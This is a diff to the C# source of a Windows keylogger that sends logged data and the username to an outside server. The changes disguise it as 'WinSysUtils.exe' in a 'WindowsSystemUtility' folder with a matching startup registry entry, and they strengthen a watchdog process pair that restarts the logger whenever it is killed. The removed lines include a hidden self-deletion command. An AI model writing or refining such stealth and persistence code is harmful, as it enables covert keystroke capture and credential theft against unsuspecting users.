@@ -19,7 +19,7 @@ namespace KeyLogger
         private static readonly HttpClient client = new HttpClient();
         private static readonly string apiUrl = "https://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;
 
-        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Shell", "Associations", "UrlAssociations", "http", "UserChoice", "KeyLogger.exe");
+        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsSystemUtility", "WinSysUtils.exe");
 
         private static bool[] lastKeyState = new bool[256];
 
@@ -29,21 +29,23 @@ namespace KeyLogger
         [STAThread]
         static void Main(String[] args)
         {
-            bool isWatchdog = args.Contains("--watchdog");
-
             if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
             {
                 // If disabled, also try to kill any running instance from the install path
                 // to make it "stop" as requested.
                 try
                 {
-                    foreach (var process in Process.GetProcessesByName("KeyLogger"))
+                    foreach (var process in Process.GetProcesses())
                     {
                         try
                         {
-                            if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                            if (process.ProcessName.Equals("WinSysUtils", StringComparison.OrdinalIgnoreCase) || 
+                                process.ProcessName.Equals("KeyLogger", StringComparison.OrdinalIgnoreCase))
                             {
-                                process.Kill();
+                                if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                                {
+                                    process.Kill();
+                                }
                             }
                         }
                         catch { }
@@ -53,7 +55,7 @@ namespace KeyLogger
                 return;
             }
 
-            if (isWatchdog)
+            if (args.Contains("--watchdog"))
             {
                 RunWatchdog();
                 return;
@@ -61,18 +63,27 @@ namespace KeyLogger
 
             EnsureInstalled();
 
-            // Start watchdog if not already running
-            StartWatchdog();
+            // Start watchdog if not running
+            if (!IsWatchdogRunning())
+            {
+                StartWatchdog();
+            }
+
+            // Start a thread to keep monitoring the watchdog
+            new Thread(() => {
+                while (true)
+                {
+                    Thread.Sleep(5000);
+                    if (!IsWatchdogRunning())
+                    {
+                        StartWatchdog();
+                    }
+                }
+            }) { IsBackground = true }.Start();
 
             while (true)
             {
                 Thread.Sleep(10);
-
-                // Watchdog monitoring: Ensure watchdog is running
-                if (!IsWatchdogRunning())
-                {
-                    StartWatchdog();
-                }
 
                 // An even more advanced check
                 bool shift = false;
@@ -162,74 +173,6 @@ namespace KeyLogger
             }
         }
 
-        private static void RunWatchdog()
-        {
-            while (true)
-            {
-                Thread.Sleep(1000);
-
-                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
-                {
-                    return;
-                }
-
-                if (!IsMainProcessRunning())
-                {
-                    try
-                    {
-                        Process.Start(InstallPath);
-                    }
-                    catch { }
-                }
-            }
-        }
-
-        private static bool IsMainProcessRunning()
-        {
-            foreach (var process in Process.GetProcessesByName("KeyLogger"))
-            {
-                try
-                {
-                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
-                    {
-                        // Check if it's NOT the watchdog
-                        // This is tricky because we can't easily see command line args of other processes in .NET 4.8 easily without WMI
-                        // But we can assume if it's running from InstallPath and we are the watchdog, there should be another one.
-                        // Actually, let's just check if there's any OTHER process with the same name and path.
-                        if (process.Id != Process.GetCurrentProcess().Id)
-                        {
-                            return true;
-                        }
-                    }
-                }
-                catch { }
-            }
-            return false;
-        }
-
-        private static bool IsWatchdogRunning()
-        {
-            // Same logic as IsMainProcessRunning - if there's another instance, we assume it's the partner.
-            // This is a bit simplistic but works for a two-process system.
-            return IsMainProcessRunning();
-        }
-
-        private static void StartWatchdog()
-        {
-            try
-            {
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = InstallPath,
-                    Arguments = "--watchdog",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true
-                };
-                Process.Start(psi);
-            }
-            catch { }
-        }
-
         private static void EnsureInstalled()
         {
             string currentExe = Process.GetCurrentProcess().MainModule.FileName;
@@ -245,14 +188,18 @@ namespace KeyLogger
                     }
 
                     // Kill existing process if it's running from InstallPath to allow overwrite
-                    foreach (var process in Process.GetProcessesByName("KeyLogger"))
+                    foreach (var process in Process.GetProcesses())
                     {
                         try
                         {
-                            if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                            if (process.ProcessName.Equals("WinSysUtils", StringComparison.OrdinalIgnoreCase) || 
+                                process.ProcessName.Equals("KeyLogger", StringComparison.OrdinalIgnoreCase))
                             {
-                                process.Kill();
-                                process.WaitForExit(5000);
+                                if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                                {
+                                    process.Kill();
+                                    process.WaitForExit(5000);
+                                }
                             }
                         }
                         catch { /* Ignore processes we can't access */ }
@@ -263,21 +210,11 @@ namespace KeyLogger
                     // Register for startup
                     using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                     {
-                        key.SetValue("KeyLogger", $"\"{InstallPath}\"");
+                        key.SetValue("WinSysUtils", $"\"{InstallPath}\"");
                     }
 
                     // Start the installed version
                     Process.Start(InstallPath);
-
-                    // Self-deletion of the original executable
-                    ProcessStartInfo psi = new ProcessStartInfo
-                    {
-                        FileName = "cmd.exe",
-                        Arguments = $"/C choice /C Y /N /D Y /T 3 & del \"{currentExe}\"",
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true
-                    };
-                    Process.Start(psi);
 
                     Environment.Exit(0);
                 }
@@ -286,6 +223,70 @@ namespace KeyLogger
                     // If installation fails (e.g. permissions), just continue running from current location
                 }
             }
+        }
+        private static void RunWatchdog()
+        {
+            while (true)
+            {
+                Thread.Sleep(1000);
+                if (!IsMainProcessRunning())
+                {
+                    try
+                    {
+                        Process.Start(InstallPath);
+                    }
+                    catch { }
+                }
+            }
+        }
+
+        private static bool IsMainProcessRunning()
+        {
+            foreach (var process in Process.GetProcessesByName("WinSysUtils"))
+            {
+                try
+                {
+                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                    {
+                        if (process.Id != Process.GetCurrentProcess().Id)
+                        {
+                            return true;
+                        }
+                    }
+                }
+                catch { }
+            }
+            return false;
+        }
+
+        private static bool IsWatchdogRunning()
+        {
+            foreach (var process in Process.GetProcessesByName("WinSysUtils"))
+            {
+                try
+                {
+                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                    {
+                        // We can't easily check args of other processes, but the watchdog will be a SECOND process 
+                        // running from the same path.
+                        if (process.Id != Process.GetCurrentProcess().Id)
+                        {
+                            return true;
+                        }
+                    }
+                }
+                catch { }
+            }
+            return false;
+        }
+
+        private static void StartWatchdog()
+        {
+            try
+            {
+                Process.Start(InstallPath, "--watchdog");
+            }
+            catch { }
         }
     }
 }
